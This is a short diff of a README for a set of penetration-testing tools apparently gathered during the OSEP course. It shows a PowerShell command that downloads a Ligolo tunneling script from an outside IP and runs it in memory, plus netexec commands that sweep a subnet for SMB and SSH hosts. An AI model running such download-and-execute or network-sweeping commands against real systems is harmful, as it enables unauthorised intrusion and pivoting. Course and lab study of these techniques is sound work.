@@ -1,7 +1,7 @@
 Just a bunch of tools built/gathered along the OSEP course.
 
 1. [Tunneling](#Tunneling)
-2. [Map the network (using netexec)](#Map the network (using netexec))
+2. [Map the network](#Map the network)
 
 
 
@@ -16,7 +16,7 @@ Make sure you are running as x64 bit process before running:
 Invoke it: `iex(iwr http://192.168.45.173:443/ligolo.ps1 -UseBasicParsing)`
 
 
-# Map the network (using netexec)
+# Map the network
 - `nxc smb 172.16.125.0/24 --log hosts.txt` (for windows hosts)
 
 - `nxc ssh 172.16.125.0/24 --log hosts.txt` (for linux hosts)
